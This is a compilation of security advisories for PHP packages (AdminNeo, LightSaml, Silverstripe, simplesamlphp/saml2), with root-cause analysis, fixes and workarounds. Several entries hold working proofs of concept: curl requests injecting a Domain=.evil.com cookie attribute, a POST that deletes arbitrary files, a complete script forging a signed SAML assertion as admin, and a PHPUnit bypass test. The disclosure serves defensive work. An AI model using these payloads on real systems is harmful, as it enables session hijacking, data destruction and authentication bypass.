- **Wide applicability:** The `X-Forwarded-Prefix` header was specifically added to support reverse proxy deployments (Traefik `PathPrefixStrip`, nginx, HAProxy). These are the exact environments where this header is forwarded from clients, making the vulnerability relevant in the deployments it was designed for.

### Affected Cookies

|**Cookie**|**Content**|**Risk**|
|`neo_sid`|PHP session ID|Session hijacking|
|`neo_key`|Encryption key for stored DB passwords|Credential theft|
|`neo_settings`|User preferences|Low (information disclosure)|

### Proof of Concept

```shell
# Normal request with clean Set-Cookie headerss:
curl -sI http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response: Set-Cookie: neo_key=...; path=/adminneo/index.php; HttpOnly; SameSite=lax

# Malicious request — inject Domain=.evil.com:
curl -sI -H "X-Forwarded-Prefix: /adminneo; Domain=.evil.com" \
  http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response: Set-Cookie: neo_key=...; path=/adminneo; Domain=.evil.com/adminneo/index.php; HttpOnly; SameSite=lax
#                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ INJECTED

# Full attribute override - inject Domain + SameSite=None:
curl -sI -H "X-Forwarded-Prefix: /; Path=/; Domain=.attacker.com; SameSite=None" \
  http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response Set-Cookie: neo_key=...; path=/; Path=/; Domain=.attacker.com; SameSite=None/adminneo/index.php; ...
```

### Recommended Fix

1. **Sanitize `X-Forwarded-Prefix`:** Strip or reject semicolons, newlines, and other HTTP header metacharacters from the `X-Forwarded-Prefix` value before using it.
2. **Use `setcookie()` / `setrawcookie()`:** Replace the manual `header("Set-Cookie: ...")` construction in `cookie()` with PHP's built-in `setcookie()` function, which properly escapes attribute values.
3. **Validate `REQUEST_URI` before cookie use:** After any prefix manipulation, strip characters that are invalid in a cookie `path` attribute (`;`, `,`, whitespace per RFC 6265).

```php
// Example fix for bootstrap.inc.php:
if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
    $prefix = preg_replace('~[;\r\n].*~', '', $_SERVER["HTTP_X_FORWARDED_PREFIX"]);
    $_SERVER["REQUEST_URI"] = $prefix . $_SERVER["REQUEST_URI"];
}
```

### Server Based Workaround Via Config

Configure the reverse proxy to set `X-Forwarded-Prefix` to a static, trusted value rather than forwarding the client-supplied header:

```nginx
# nginx — secure configuration:
fastcgi_param HTTP_X_FORWARDED_PREFIX /adminneo;  # static value, not $http_x_forwarded_prefix
```

```yaml
# Traefik, use middleware instead of client headers:
middlewares:
  strip-prefix:
    stripPrefix:
      prefixes:
        - "/adminneo"
```

References:
- https://github.com/adminneo-org/adminneo/security/advisories/GHSA-79wv-8rh2-9vp2 [WEB]
- https://github.com/adminneo-org/adminneo/commit/aa6f2544a8a65cf5e8317f1a902f74181e136d64 [WEB]
- https://github.com/adminneo-org/adminneo [PACKAGE]
- https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1 [WEB]

### GHSA-6vfx-w7q3-42gq — AdminNeo SQLite Database-List Drop Arbitrary File Deletion
- Aliases: CVE-2026-96633 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-73
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`
- Affected Packagist/adminneo-org/adminneo: introduced:0 fixed:5.5.1

## Summary

AdminNeo allows an authenticated SQLite-mode user to delete arbitrary files writable by the PHP process through the database-list drop action. The SQLite driver validates file extensions when creating or renaming databases, but the database-list drop path passes submitted `db[]` values directly to `unlink()`.

Originally reported by @slpoiuewalspoid-dotcom in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-6pg3-chwq-wgqc

## Impact

An authenticated AdminNeo SQLite user with a valid CSRF token can submit an arbitrary relative file path in the database-list `db[]` field. If the PHP process can delete that path, AdminNeo unlinks it even when the file is not a SQLite database.

## Root Cause

The database-list page accepts selected database names from the POST body and calls `drop_databases()`:

```php
if ($_POST["db"]) {
	queries_redirect(substr(ME, 0, -1), lang('Databases have been dropped.'), drop_databases($_POST["db"]));
}
```

In SQLite mode, `drop_databases()` attaches an in-memory database and unlinks each submitted path directly:

```php
function drop_databases($databases): bool
{
	Connection::get()->close(); // to unlock file, doesn't work in PDO on Windows
	foreach ($databases as $db) {
		if (!@unlink($db)) {
			Connection::get()->setError(lang('File exists.'));
			return false;
		}
	}
	return true;
}
```

The same SQLite driver protects create and rename operations with `check_sqlite_name()`, which requires a `.db`, `.sdb`, or `.sqlite` extension:

```php
function check_sqlite_name($name) {
	// avoid creating PHP files on unsecured servers
	$extensions = "db|sdb|sqlite";
	if (!preg_match("~^[^\\0]*\\.($extensions)\$~", $name)) {
		Connection::get()->setError(lang('Please use one of the extensions %s.', str_replace("|", ", ", $extensions)));
		return false;
	}
	return true;
}
```

The drop path does not apply an equivalent extension check or bind the submitted path to a known listed SQLite database.

## POC

### 1. Start a complete AdminNeo application

Build and start AdminNeo from the audited source using the official standalone Docker image shape. The validation image copies the audited source tree into `/var/www/html` and starts Nginx HTTP server.

Log in through the SQLite entry point using a SQLite database path `poc.sqlite`.

### 2. Prepare a writable target file

Place a non-database file under a location writable by the AdminNeo PHP process. The validation used:

```
/var/www/html/poc-delete-target.txt
```

The same directory also contained a SQLite database:

```
/var/www/html/poc.sqlite
```

### 3. Submit the database-list drop request

Use the authenticated session and live CSRF token, but submit the non-database path as the selected database:

```http
POST /?sqlite=&username= HTTP/1.1
Host: <adminer-host>
Cookie: <authenticated-session>
Content-Type: application/x-www-form-urlencoded

db[]=/var/www/html/poc-delete-target.txt&all=&drop=Drop&token=<live-csrf-token>
```

The request reaches `drop_databases($_POST["db"]),` and SQLite `drop_databases()` calls `unlink()` on the submitted non-database path.

After the request, the `poc-delete-target.txt` was deleted.

## Suggested Fix

Apply the same target validation used by SQLite create/rename before deleting database files. At minimum:
- Reject paths whose basename does not end in `.db`, `.sdb`, or `.sqlite`.
- Bind `db[]` values to databases returned by AdminNeo's database listing instead of trusting submitted paths.
- Resolve paths before deletion and reject traversal outside the expected SQLite database directory.
- Consider requiring the current selected database path for delete operations instead of accepting arbitrary submitted file paths.

References:
- https://github.com/adminneo-org/adminneo/security/advisories/GHSA-6vfx-w7q3-42gq [WEB]
- https://github.com/adminneo-org/adminneo/commit/26fcef2f32922629751cbea6c0bb593fbf1e957d [WEB]
- https://github.com/adminneo-org/adminneo [PACKAGE]
- https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1 [WEB]

### GHSA-w553-pwx6-3mg9 — lightsaml allows Signature wrapping bypass
- Aliases: CVE-2026-63182 | Published: 2026-11-16 | Modified: 2026-11-16 | Severity: HIGH
- CWE: CWE-347
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- Affected Packagist/litesaml/lightsaml: introduced:5.0.0 fixed:5.0.1
- Affected Packagist/litesaml/lightsaml: introduced:4.0.0 fixed:4.7.1

### Summary

LightSaml 5.0.0 (latest release; also confirmed on 4.6.1) validates an inbound `samlp:Response` by collecting its direct-child `saml:Assertion` elements and validating each one's `ds:Signature` via robrichards/xmlseclibs. The two layers disagree on which element a signature actually covers: LightSaml reads claims from the assertion node it collected, while xmlseclibs resolves the signed `Reference URI="#id"` with a document-wide `//*[@Id]` XPath that returns the first ID-bearing element anywhere in the document.

An attacker who has captured one genuine signed assertion can exploit this to surface attacker-authored, unsigned claims.

### Details

`Response::deserialize` collects assertions with `manyElementsFromXml`, whose relative XPath `saml:Assertion` matches only direct children of the `Response`. Each collected assertion is validated independently by `AssertionSignatureValidatorAction` against the out-of-band trusted IdP credential (resolved by Issuer entityId, never from the document):

https://github.com/litesaml/lightsaml/blob/5.0.0/src/Model/Protocol/Response.php#L122
https://github.com/litesaml/lightsaml/blob/5.0.0/src/Model/AbstractSamlModel.php#L93
https://github.com/litesaml/lightsaml/blob/5.0.0/src/Action/Assertion/Inbound/AssertionSignatureValidatorAction.php#L28

The check delegates to xmlseclibs `XMLSecurityDSig::validateReference()`, which first removes the signature node being validated from the shared document (enveloped-signature removal):

```php
if (! $docElem->isSameNode($this->sigNode)) {
    if ($this->sigNode->parentNode != null) {
        $this->sigNode->parentNode->removeChild($this->sigNode);   // strips sig from shared DOM
    }
}
```

https://github.com/robrichards/xmlseclibs/blob/3.1.5/src/XMLSecurityDSig.php#L596

`processRefNode()` then resolves `URI="#id"` document-wide and takes `item(0)`, the first ID-bearing element in the whole document, any name or namespace, not the one inside the signature's own subtree:

```php
$query = '//*['.$iDlist.']';
$dataObject = $xPath->query($query)->item(0);
```

https://github.com/robrichards/xmlseclibs/blob/3.1.5/src/XMLSecurityDSig.php#L525

So the digest target xmlseclibs picks (`//*[@Id]` item(0), anywhere) which isn't necessarily the one from the previous phase. LightSaml then reads claims (Subject/NameID, Conditions, Attributes) from the node it collected:

https://github.com/litesaml/lightsaml/blob/5.0.0/src/Model/Assertion/Assertion.php#L288

An example attacker buries the genuine signed bytes (the assertion with its `ds:Signature` element stripped) inside `samlp:Extensions`, so it is the first `@Id` element in document order but not a direct-child assertion. Present one forged direct-child assertion with the same `ID`, attacker claims, and a verbatim copy of the genuine `ds:Signature`:

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>

  <!-- GENUINE signed bytes, buried in Extensions: first @Id document-wide (xmlseclibs picks this),
       but NOT a direct-child assertion (LightSaml ignores it). Signature element removed so the
       enveloped+exc-c14n digest target is the assertion sans Signature. -->
  <samlp:Extensions>
    <saml:Assertion ID="_signed_assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
      <saml:Issuer>https://idp.example.com</saml:Issuer>
      <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
      <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
      <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
    </saml:Assertion>
  </samlp:Extensions>

  <!-- FORGED: the ONLY direct-child assertion LightSaml collects. SAME ID, attacker claims,
       verbatim copy of the genuine ds:Signature. -->
  <saml:Assertion ID="_signed_assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"> ...byte-for-byte copy of the genuine signature... </ds:Signature>
    <saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2040-01-01T00:00:00Z" NotOnOrAfter="2041-01-01T00:00:00Z"/>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

### PoC

```bash
#!/usr/bin/env bash
set -euo pipefail
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT; cd "$WORK"
IDP_ENTITY="https://idp.example.com"; ASSERTION_ID="_signed_assertion"

composer require litesaml/lightsaml:5.0.0 --no-interaction --quiet

# trusted IdP key + self-signed cert (out-of-band trust anchor)
openssl req -x509 -newkey rsa:2048 -keyout idp_key.pem -out idp_cert.pem -days 3650 -nodes \
  -subj "/CN=idp.example.com" >/dev/null 2>&1

# genuine Response with one to-be-signed assertion
cat > genuine_tmpl.xml <<XML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_resp" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>${IDP_ENTITY}</saml:Issuer>
  <saml:Assertion ID="${ASSERTION_ID}" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>${IDP_ENTITY}</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#${ASSERTION_ID}">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue></ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue></ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
XML

# REAL signature over the genuine assertion (RSA-SHA256, enveloped + exc-c14n)
xmlsec1 --sign --lax-key-search --privkey-pem idp_key.pem \
  --id-attr:ID "urn:oasis:names:tc:SAML:2.0:assertion:Assertion" \
  --output genuine_signed.xml genuine_tmpl.xml >/dev/null

# TAMPER: bury the genuine bytes (signature stripped) in samlp:Extensions as the first @Id element,
# and make the ONLY direct-child assertion a forged one carrying a verbatim copy of the genuine
# signature + attacker claims.
php -r '
$doc = new DOMDocument(); $doc->load("genuine_signed.xml");
$xp = new DOMXPath($doc);
$xp->registerNamespace("saml","urn:oasis:names:tc:SAML:2.0:assertion");
$xp->registerNamespace("ds","http://www.w3.org/2000/09/xmldsig#");
$resp = $doc->documentElement;
$genuine = $xp->query("//saml:Assertion[@ID=\"_signed_assertion\"]")->item(0);
$copiedSig = $doc->saveXML($xp->query("./ds:Signature", $genuine)->item(0));

// buried = genuine clone WITHOUT its signature (the enveloped+exc-c14n digest target)
$buried = $genuine->cloneNode(true);
$buried->removeChild($xp->query("./ds:Signature", $buried)->item(0));

// forged = copied signature + attacker claims (the only direct-child assertion)
$forged =
  "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_signed_assertion\" Version=\"2.0\" IssueInstant=\"2024-01-01T00:00:00Z\">"
  ."<saml:Issuer>https://idp.example.com</saml:Issuer>".$copiedSig
  ."<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>"
  ."<saml:Conditions NotBefore=\"2040-01-01T00:00:00Z\" NotOnOrAfter=\"2041-01-01T00:00:00Z\"/>"
  ."<saml:AttributeStatement><saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>"
  ."</saml:Assertion>";
$frag = $doc->createDocumentFragment(); $frag->appendXML($forged);

// Extensions(buried genuine) replaces the original assertion (first @Id, doc order); forged appended after
$ext = $doc->createElementNS("urn:oasis:names:tc:SAML:2.0:protocol","samlp:Extensions");
$ext->appendChild($buried);
$resp->replaceChild($ext, $genuine);
$resp->appendChild($frag);
file_put_contents("tampered.xml", $doc->saveXML());
'

# SP consumer: LightSaml real per-assertion validation, pinned cert, requireSignature=true
cat > consumer.php <<'PHP'
<?php
require __DIR__ . '/vendor/autoload.php';
use LightSaml\Action\Assertion\Inbound\AssertionSignatureValidatorAction;
use LightSaml\Context\Profile\{AssertionContext, ProfileContext};
use LightSaml\Credential\{UsageType, X509Certificate, X509Credential};
use LightSaml\Context\Model\DeserializationContext;   // moved from Model\Context in 5.0.0
use LightSaml\Model\Protocol\SamlMessage;
use LightSaml\Resolver\Credential\Factory\CredentialResolverFactory;
use LightSaml\Store\Credential\StaticCredentialStore;
use LightSaml\Validator\Model\Signature\SignatureValidator;
use Psr\Log\NullLogger;

[$_, $xmlPath, $certPath, $idpEntityId] = $argv;
$x509 = new X509Certificate(); $x509->loadPem(file_get_contents($certPath));   // pinned trust anchor
$cred = new X509Credential($x509); $cred->setEntityId($idpEntityId); $cred->setUsageType(UsageType::SIGNING);
$store = new StaticCredentialStore(); $store->add($cred);
$validator = new SignatureValidator((new CredentialResolverFactory($store))->build());
$action = new AssertionSignatureValidatorAction(new NullLogger(), $validator, true); // requireSignature=true

$message = SamlMessage::fromXML(file_get_contents($xmlPath), new DeserializationContext());
$profile = new ProfileContext('profile', ProfileContext::ROLE_SP);
$bypass = false;
echo "assertions LightSaml collected: " . count($message->getAllAssertions()) . "\n";
foreach ($message->getAllAssertions() as $i => $a) {
    $nameId = ($a->getSubject() && $a->getSubject()->getNameID()) ? $a->getSubject()->getNameID()->getValue() : '(none)';
    $attrs = [];
    foreach ($a->getAllAttributeStatements() as $s) foreach ($s->getAllAttributes() as $at)
        $attrs[$at->getName()] = implode(',', array_map(fn($v) => (string)$v, $at->getAllAttributeValues()));
    echo "ASSERTION #$i  NameID=$nameId  Attributes=".json_encode($attrs)."\n";
    $ctx = new AssertionContext(); $ctx->setAssertion($a); $ctx->setParent($profile);
    try { $action->execute($ctx); $r = 'ACCEPTED'; } catch (\Throwable $e) { $r = 'REJECTED: '.$e->getMessage(); }
    echo "  LightSaml validation: $r\n";
    if ($r === 'ACCEPTED' && (strpos($nameId,'evil.com') !== false || ($attrs['role'] ?? '') === 'admin')) {
        $bypass = true; echo "  >>> BYPASS: forged assertion validated AND attacker claims surfaced\n";
    }
}
echo $bypass ? "RESULT: BYPASS CONFIRMED\n" : "RESULT: no bypass\n";
exit($bypass ? 0 : 1);
PHP

php consumer.php tampered.xml idp_cert.pem "$IDP_ENTITY"
```

Observed output:

```
assertions LightSaml collected: 1
ASSERTION #0  NameID=attacker@evil.com  Attributes={"role":"admin"}
  LightSaml validation: ACCEPTED
  >>> BYPASS: forged assertion validated AND attacker claims surfaced
RESULT: BYPASS CONFIRMED
```

### Impact

Authentication bypass / privilege escalation. An attacker who has captured one genuine signed assertion (e.g. their own prior login response) can have LightSaml accept a single, fully attacker-authored assertion as IdP-signed.

### GHSA-c94f-87xg-65wf — Silverstripe Framework: RCE via i18nTextCollectorTask writer parameter
- Aliases: CVE-2026-91115 | Published: 2026-11-16 | Modified: 2026-11-16 | Severity: HIGH
- CWE: CWE-470
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
- Affected Packagist/silverstripe/framework: introduced:6.0.0 fixed:6.2.13

### Impact
The writer option of the i18nTextCollectorTask dev task was passed to the injector without validation. A crafted dev task URL could create arbitrary objects with attacker-controlled constructor arguments and run code on the server. Because the dev task did not ask for confirmation, an administrator could be tricked into running it by following a link. On a site in dev mode, no login was needed. CMS 5 is not affected.

### Reported by
Jack Wallace

### GHSA-r7hw-jx6r-756g — SAML2: Incomplete fix of CVE-2026-49283: unsigned embedded Response bypasses HTTP-Artifact signature verification (no embedded-Issuer binding)
- Aliases: CVE-2026-110782 | Published: 2026-11-17 | Modified: 2026-11-17 | Severity: HIGH
- CWE: CWE-287, CWE-347
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`
- Affected Packagist/simplesamlphp/saml2: introduced:6.2.2 fixed:6.2.4
- Affected Packagist/simplesamlphp/saml2: introduced:7.0.0-rc1 fixed:7.0.0-rc2

## Summary
CVE-2026-49283 / GHSA-6929-8p9f-26jx ("HTTP-Artifact TLS validator confusion allows cross-IdP authentication bypass") was fixed so that `HTTPArtifact::receive()` verifies the embedded SAML `Response` using the IdP metadata signing keys. The current implementation (master `31c72c1d`, released **v6.2.3**) reaches that verification **only when the embedded Response is signed**:

```php
// src/Binding/HTTPArtifact.php  (receive())
if (!$samlResponse->isSigned()) {
    return $samlResponse;                         // ← unsigned embedded Response returned UNVERIFIED
}
return $this->verifyMessageSignature($samlResponse, $idpMetadata);   // only runs when signed
```

An attacker who controls one trusted-federation IdP therefore returns a **validly-signed outer `ArtifactResponse`** (signed with their own real key, which passes the mandatory outer check) that **wraps an *unsigned* `<samlp:Response>` whose `<Issuer>` names a *different* IdP**. `isSigned()` is false, so `verifyMessageSignature()` never runs and the forged Response is returned as successfully received. Additionally, even on the signed path `verifyMessageSignature()` verifies against the **artifact issuer's** metadata keys but **never asserts that the embedded Response's `<Issuer>` equals the artifact issuer** — the same cross-IdP confusion the CVE was assigned for is not closed by identity binding.

This is an incomplete implementation of the fix's own stated goal ("verify signatures using IdP metadata signing keys", commit `dac0b4b6` / #419), and a regression introduced by the `#414` refactor (v6.2.2) — the official CVE fix in **v6.2.1 did not contain this short-circuit**.

## Affected component
- `src/Binding/HTTPArtifact.php`
  - `receive()` line **206-207**: `if (!$samlResponse->isSigned()) { return $samlResponse; }` — the bypassed guard.
  - `receive()` line 210: `verifyMessageSignature($samlResponse, $idpMetadata)` — only reached when signed.
  - `verifyMessageSignature()` lines 230-286: verifies against `$idpMetadata` (artifact-issuer keys); **no `getIssuer()` comparison** to bind the embedded Response to the artifact issuer.
  - `verifyArtifactResponseSignature()` line **300-302**: `if ($artifactResponse->isSigned() !== true) throw` — the OUTER response is mandatorily signed; the asymmetry with the embedded `return`-on-unsigned is the defect.
- Regression commit **3b589636** (#414, v6.2.2, "refactor/soap-ssl-validator-openssl"); key-source fix **dac0b4b6** (#419) left the short-circuit unchanged.
- **Affected: v6.2.2, v6.2.3 (latest), and master.** v6.2.1 (official CVE fix) used a deferred-validator model without this short-circuit.

## Reachability (hop-by-hop, guards named)
Threat model: SP uses the HTTP-Artifact binding in a multi-IdP federation; attacker operates one trusted IdP-B (valid `saml20-idp-remote` metadata, real signing key, an ArtifactResolutionService). Goal: impersonate `admin@IdP-A`.
1. Attacker hits the SP artifact endpoint with `SAMLart` encoding `sourceId = sha1(IdP-B entityID)` — line 137-138, no guard.
2. `getMetaDataConfigForSha1` → `$idpMetadata` = IdP-B — line 144. Guard: metadata exists → satisfied (IdP-B trusted).
3. SP resolves against IdP-B's ARS (attacker's endpoint) — line 176-182.
4. IdP-B returns a validly-signed `ArtifactResponse`; `verifyArtifactResponseSignature(...,IdP-B)` passes (signed by the artifact issuer) — line 193/300. **Guard satisfied by the attacker (they ARE the artifact issuer).**
5. The signed outer wraps an **unsigned** `<samlp:Response Issuer=IdP-A>` with an assertion for `admin@IdP-A` — line 195, no guard on embedded content.
6. `if (!$samlResponse->isSigned()) return $samlResponse;` → **TRUE → returns the forged Response unverified** — line 206-207. `verifyMessageSignature` (210) never runs; there is no issuer==artifact-issuer check anywhere in `receive()`.

Every guard on the embedded message is absent; the outer/embedded mandatory-vs-optional asymmetry is the root cause.

## Root cause
The `#414` refactor moved embedded-Response verification into `receive()` but gated it on `isSigned()` (mirroring `if (!isSigned()) return` instead of the outer's `if (isSigned() !== true) throw`), and the `dac0b4b6` key-source fix did not revisit that gate. The artifact binding's designed trust model is that the embedded message is authenticated by the binding (the assertion need not be individually signed), so a conformant integrator relies on `receive()` to have authenticated it — exactly the reliance this gap defeats.

## Proof of concept (executed, benign)
The PoC exercises the **real shipped private methods** `verifyArtifactResponseSignature()` and
`verifyMessageSignature()` via reflection — exactly as the maintainers' own
`tests/SAML2/Binding/HTTPArtifactTest.php` does — and reproduces `receive()`'s verbatim
post-resolution decision (lines 195/206-210) against real `HTTPArtifact` internals. It models a
validly-signed **outer** `ArtifactResponse` from the artifact issuer **IdP-B** (attacker-controlled,
its signing cert in metadata) wrapping an **unsigned** embedded `<samlp:Response>` claiming
`Issuer=IdP-A`. No destructive payload; the marker is the SKIPPED verification.

Run: `vendor/bin/phpunit --no-coverage tests/SAML2/Binding/PocArtifact001Test.php`

```php
// tests/SAML2/Binding/PocArtifact001Test.php  (namespace SimpleSAML\Test\SAML2\Binding)
// IdP-B metadata (artifact issuer, attacker-controlled) with a real signing cert:
$idpB = Configuration::loadFromArray(['entityid' => 'https://idp-b.example/', 'keys' => [[
    'type' => 'X509Certificate', 'signing' => true, 'encryption' => false,
    'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
]]], '[idp-b]');
$ha = new HTTPArtifact();

// Forged embedded Response: UNSIGNED, claims Issuer=IdP-A; verify() throws if ever called.
$embedded = $this->createStub(Response::class);
$embedded->method('isSigned')->willReturn(false);
$embedded->method('getSignature')->willReturn(null);
$embedded->method('verify')->willThrowException(new Exception('POC-FAIL: embedded verify() called'));

// Outer ArtifactResponse: validly signed by IdP-B (verify() returns self), wraps the embedded.
$outer = $this->createStub(ArtifactResponse::class);
$outer->method('isSigned')->willReturn(true);
$outer->method('isSuccess')->willReturn(true);
$outer->method('verify')->willReturnCallback(fn() => $outer);
$outer->method('getSignature')->willReturn(self::sigEl());
$outer->method('getMessage')->willReturn($embedded);

// ---- verbatim HTTPArtifact::receive() post-resolution logic ----
$verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB); // OUTER mandatory — passes vs IdP-B
$samlResponse  = $verifiedOuter->getMessage();
$verifyMessageSignatureCalled = false;
if (!$samlResponse->isSigned()) { $received = $samlResponse; }          // <-- BYPASS (line 206-207)
else { $verifyMessageSignatureCalled = true; $received = $this->call($ha,'verifyMessageSignature',$samlResponse,$idpB); }

self::assertFalse($samlResponse->isSigned());
self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature SKIPPED');
self::assertSame($embedded, $received, 'unsigned embedded Response returned unverified');
// Negative control: the real verifier CANNOT accept the unsigned message → the short-circuit is load-bearing.
$threw = false; try { $this->call($ha,'verifyMessageSignature',$samlResponse,$idpB); } catch (\Throwable $e) { $threw = true; }
self::assertTrue($threw, 'real verifyMessageSignature rejects the unsigned Response');
```

Observed benign output:
```
PHPUnit 13.2.4 by Sebastian Bergmann and contributors.
Runtime:       PHP 8.4.5
[POC] SAML2-ARTIFACT-001 CONFIRMED: signed outer ArtifactResponse (IdP-B) + UNSIGNED embedded Response
      => receive() returns it with verifyMessageSignature() SKIPPED; the real verifier would reject it.
.                                                                   1 / 1 (100%)
OK (1 test, 5 assertions)
```
The five assertions prove: the outer ArtifactResponse verifies against the **artifact issuer (IdP-B)**
metadata; the embedded Response is unsigned; `verifyMessageSignature()` is **skipped**; the unsigned
embedded Response is **returned as received**; and the real verifier **rejects** that same unsigned
message — so the `isSigned()` short-circuit is the sole reason it is accepted.

*(Environment note: `composer install` needed a `platform.composer-plugin-api=2.9.0` override with
`--no-plugins` to resolve `xml-common`'s installer-plugin constraint under Composer 2.8.6; no code
under test was modified.)*

## Adversarial re-read (what I tried to refute it with)
- **Strongest objection (why CONDITIONAL, not CONFIRMED):** the downstream SimpleSAMLphp SP module may route `receive()`'s output through the response/assertion processor, which requires *either* the response signed *or* every assertion signed (`src/Response/Processor.php:155-162`) — that would reject the unsigned forged Response and reduce this to defense-in-depth. I cannot confirm or refute this from the saml2 repo alone (the SP module is a different repo). BUT: (i) the artifact binding's whole rationale is that the embedded message need not be individually signed, so integrators relying on the binding will *not* impose that requirement; (ii) the CVE was assigned against this library and `dac0b4b6`'s stated contract is that `receive()` authenticates the embedded Response — a contract it fails for unsigned messages; (iii) unlike the redirect mock-key dead-path, the unsigned path is exercised in *normal* artifact operation, so the missing verification is live, not dead code.
- **Not a false positive on the code:** the short-circuit (206-207), the absent issuer binding, and the outer `throw` vs embedded `return` asymmetry (300 vs 206) are verbatim in master and released v6.2.3.

## Remediation
In `receive()`, make embedded-Response authentication mandatory and issuer-bound — mirror the outer pattern: after line 195, reject unless `$samlResponse->isSigned()` **and** `verifyMessageSignature()` succeeds **and** `$samlResponse->getIssuer()?->getContent()->getValue() === $idpMetadata->getString('entityid')`. Replace `if (!isSigned()) return` with `if (isSigned() !== true) throw`.

## Confidence
**High** at the library-contract level — the incomplete-fix is code-verified and the PoC fires against
the real shipped verification methods. **CONDITIONAL** only for the end-to-end auth bypass (requires the
HTTP-Artifact binding in use and an integrator relying on the binding to authenticate the embedded
message — the binding's designed trust model). Reported to the maintainers as a gap in their own
`dac0b4b6` fix, present in the latest release v6.2.3.


## Proof-of-Concept source (`PocArtifact001Test.php`)

```php
<?php

declare(strict_types=1);

namespace SimpleSAML\Test\SAML2\Binding;

use Exception;
use PHPUnit\Framework\TestCase;
use ReflectionMethod;
use SimpleSAML\Configuration;
use SimpleSAML\SAML2\Binding\HTTPArtifact;
use SimpleSAML\SAML2\XML\samlp\ArtifactResponse;
use SimpleSAML\SAML2\XML\samlp\Response;
use SimpleSAML\XMLSecurity\TestUtils\PEMCertificatesMock;

/**
 * PoC — SAML2-ARTIFACT-001: incomplete fix of CVE-2026-49283.
 *
 * HTTPArtifact::receive() contains (master 31c72c1d / released v6.2.3):
 *     $artifactResponse = $this->verifyArtifactResponseSignature($artifactResponse, $idpMetadata); // OUTER: mandatory
 *     $samlResponse = $artifactResponse->getMessage();
 *     ...
 *     if (!$samlResponse->isSigned()) {
 *         return $samlResponse;                                    // <-- EMBEDDED: returned UNVERIFIED
 *     }
 *     return $this->verifyMessageSignature($samlResponse, $idpMetadata);
 *
 * This test reproduces that exact post-resolution decision against real HTTPArtifact
 * private methods (via reflection, exactly as the shipped HTTPArtifactTest does) and shows
 * that an attacker who returns a validly-signed OUTER ArtifactResponse (signed by the
 * artifact issuer IdP-B) wrapping an UNSIGNED embedded Response is accepted with ZERO
 * signature verification of that embedded Response.
 */
final class PocArtifact001Test extends TestCase
{
    private function idpBMetadata(): Configuration
    {
        // "IdP-B": the federated IdP the attacker controls; its signing cert is in metadata,
        // selected from the SAMLart sourceId. (Uses the same mock cert the shipped test uses.)
        return Configuration::loadFromArray([
            'entityid' => 'https://idp-b.example/',
            'keys' => [[
                'type' => 'X509Certificate',
                'signing' => true,
